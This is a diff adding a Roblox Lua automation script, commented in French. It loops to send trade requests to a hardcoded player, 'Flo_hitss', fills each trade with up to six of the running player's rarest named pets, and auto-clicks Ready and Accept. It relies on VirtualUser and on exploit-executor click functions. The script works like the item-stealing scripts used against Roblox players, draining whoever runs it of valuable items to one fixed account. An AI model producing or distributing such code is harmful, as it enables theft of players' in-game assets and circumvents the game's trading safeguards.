@@ -1,0 +1,226 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local GuiService = game:GetService("GuiService")
+local VirtualUser = game:GetService("VirtualUser")
+
+-- 🎯 CONFIGURATION MOBILE
+local TARGET_PLAYER_NAME = "Flo_hitss"
+local TEMPS_ENTRE_2_TRADES = 10 
+local OFFSET_X = 0 -- Ajuste si ça clique à côté horizontalement
+local OFFSET_Y = 0 -- Ajuste si ça clique à côté verticalement (ex: 50 pour la barre de statut)
+
+local SEARCH_ORDER = {
+    "The Ethereal Everia", "The Grand Titan", "Frozen Dragon", "Enchanted Pegasus",
+    "Great Auk", "The Frozen Ancient", "Lava Monster", "Ghost Pirate",
+    "King Desert Slime", "Big 100M", "Naga", "Tiki", "Hornet",
+    "Ice Serpent", "King Julian", "Inferno Bee", "Black Ice Bee"
+}
+
+local MAX_PETS = 6 
+local DELAY_SEARCH = 0.03 
+local CLICK_HOLD = 0.03   
+
+-- ⚙️ FONCTION DE CLIC POUR MOBILE
+local function mobileClick(button)
+    if not button then return end
+    
+    -- Calcul de la position (avec offset pour mobile)
+    local inset = GuiService:GetGuiInset()
+    local posX = button.AbsolutePosition.X + (button.AbsoluteSize.X / 2) + inset.X + OFFSET_X
+    local posY = button.AbsolutePosition.Y + (button.AbsoluteSize.Y / 2) + inset.Y + OFFSET_Y
+    
+    -- 🔴 Point rouge de debug (disparaît après 1 sec)
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0, 12, 0, 12)
+    dot.Position = UDim2.new(0, posX - 6, 0, posY - 6)
+    dot.BackgroundColor3 = Color3.new(1, 0, 0)
+    dot.Parent = PlayerGui
+    task.delay(1, function() dot:Destroy() end)
+    
+    -- ⚡ Tentative de clic avec VirtualUser (plus fiable sur mobile)
+    pcall(function()
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton1(Vector2.new(posX, posY))
+    end)
+    
+    -- Fallback : si VirtualUser ne marche pas, on utilise mousemoveabs
+    if mousemoveabs and mouse1click then
+        pcall(function()
+            mousemoveabs(posX, posY)
+            task.wait(0.05)
+            mouse1click()
+        end)
+    end
+    
+    task.wait(CLICK_HOLD)
+end
+
+-- =====================================================================
+-- 🔄 BOUCLE INFINIE
+-- =====================================================================
+while true do
+    print("🔄 Nouveau cycle de trade...")
+    
+    local Mainscreen = PlayerGui:WaitForChild("Mainscreen")
+    local TradePlayerGui = PlayerGui:WaitForChild("TradePlayer")
+    local TradingGui = PlayerGui:FindFirstChild("Trading")
+    
+    if TradingGui and TradingGui.Enabled then
+        local closeTrade = TradingGui.Container.Frame:FindFirstChild("Close", true)
+        if closeTrade then mobileClick(closeTrade) task.wait(0.5) end
+    end
+
+    -- 1. Ouvrir le menu
+    if not TradePlayerGui.Enabled then
+        local blueButton = Mainscreen.Right:FindFirstChild("TradePlayer")
+        if blueButton then
+            mobileClick(blueButton)
+            task.wait(1) 
+        end
+    end
+
+    -- 2. Chercher Flo_hitss
+    local scrollingFrame = TradePlayerGui.Container.General.Frame.Frame.ScrollingFrame
+    local targetGreenButton = nil
+
+    for _, obj in ipairs(scrollingFrame:GetDescendants()) do
+        if obj:IsA("TextLabel") and string.find(string.lower(obj.Text), string.lower(TARGET_PLAYER_NAME)) then
+            local parent = obj.Parent
+            while parent and parent ~= scrollingFrame do
+                local btn = parent:FindFirstChild("Trade", true)
+                if btn and btn:IsA("TextButton") then
+                    targetGreenButton = btn
+                    break
+                end
+                parent = parent.Parent
+            end
+            if targetGreenButton then break end
+        end
+    end
+
+    if targetGreenButton then
+        print("✅ Envoi de la demande à " .. TARGET_PLAYER_NAME)
+        mobileClick(targetGreenButton)
+        local closeBtn = TradePlayerGui.Container.General:FindFirstChild("Close", true)
+        if closeBtn then task.wait(0.2) mobileClick(closeBtn) end
+    else
+        warn("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente de 10 secondes...")
+        task.wait(10)
+    end
+
+    if targetGreenButton then
+        -- 3. Attendre l'acceptation
+        print("⏳ Attente d'acceptation...")
+        local waitTime = 0
+        local tradeOuvert = false
+        
+        while waitTime < 60 do
+            task.wait(0.5)
+            waitTime = waitTime + 0.5
+            local tg = PlayerGui:FindFirstChild("Trading")
+            if tg and tg.Enabled then
+                tradeOuvert = true
+                break
+            end
+        end
+
+        if tradeOuvert then
+            print("🎉 Trade ouvert ! Ajout des pets...")
+            task.wait(1) 
+
+            local TradeFrame = TradingGui.Container.Frame
+            local CurInventory = TradeFrame.CurInventory.ScrollingFrame
+            local CurOffer = TradeFrame.CurOffer
+            local SearchBar = TradeFrame.CurInventory.Search:FindFirstChildOfClass("TextBox")
+
+            local function typeSearch(text)
+                SearchBar:CaptureFocus()
+                SearchBar.Text = text
+                SearchBar:ReleaseFocus()
+            end
+
+            local petsAdded = 0
+            local petsToAdd = MAX_PETS
+            for _, child in ipairs(CurOffer:GetChildren()) do
+                if child:IsA("TextButton") or child.Name:find("_") then
+                    petsToAdd = petsToAdd - 1
+                end
+            end
+
+            if petsToAdd > 0 then
+                for _, petName in ipairs(SEARCH_ORDER) do
+                    if petsAdded >= petsToAdd then break end
+                    
+                    typeSearch(petName)
+                    task.wait(DELAY_SEARCH) 
+                    
+                    local foundAny = true
+                    while foundAny and petsAdded < petsToAdd do
+                        foundAny = false
+                        for _, item in ipairs(CurInventory:GetChildren()) do
+                            if petsAdded >= petsToAdd then break end
+                            
+                            if string.find(string.lower(item.Name), string.lower(petName)) then
+                                if not CurOffer:FindFirstChild(item.Name) then
+                                    local btn = item:IsA("TextButton") and item or item:FindFirstChild("Frame")
+                                    if btn then
+                                        foundAny = true
+                                        mobileClick(btn)
+                                        
+                                        local waitTimer = 0
+                                        while not CurOffer:FindFirstChild(item.Name) and waitTimer < 20 do
+                                            task.wait(0.01)
+                                            waitTimer = waitTimer + 1
+                                        end
+                                        petsAdded = petsAdded + 1
+                                        break 
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+                typeSearch("")
+            end
+
+            if petsAdded == 0 then
+                warn("🛑 Plus aucun pet rare trouvé. Arrêt de la boucle.")
+                break 
+            end
+
+            -- 5. Ready
+            print("⏳ Clic sur Ready !")
+            local readyBtn = TradeFrame:FindFirstChild("Ready")
+            if readyBtn then
+                mobileClick(readyBtn)
+                
+                local timer = 0
+                while timer < 30 do
+                    task.wait(0.05) 
+                    timer = timer + 0.05
+                    
+                    local acceptBtn = TradeFrame:FindFirstChild("Confirm") or TradeFrame:FindFirstChild("Accept")
+                    if readyBtn and readyBtn.Text == "Accept" then acceptBtn = readyBtn end
+                    
+                    if acceptBtn then
+                        print("✅ Clic final sur Accepter !")
+                        task.wait(0.05)
+                        mobileClick(acceptBtn)
+                        print("🎉 Trade terminé avec succès !")
+                        break
+                    end
+                end
+            end
+        else
+            warn("❌ Flo_hitss n'a pas accepté la demande.")
+        end
+    end
+    
+    print("⏳ Cooldown : Attente de " .. TEMPS_ENTRE_2_TRADES .. " secondes...")
+    for i = TEMPS_ENTRE_2_TRADES, 1, -1 do
+        task.wait(1)
+        print("   ⏱️ Prochain trade dans " .. i .. " sec...")
+    end
+    print("🚀 Reprise de la boucle !")
+end
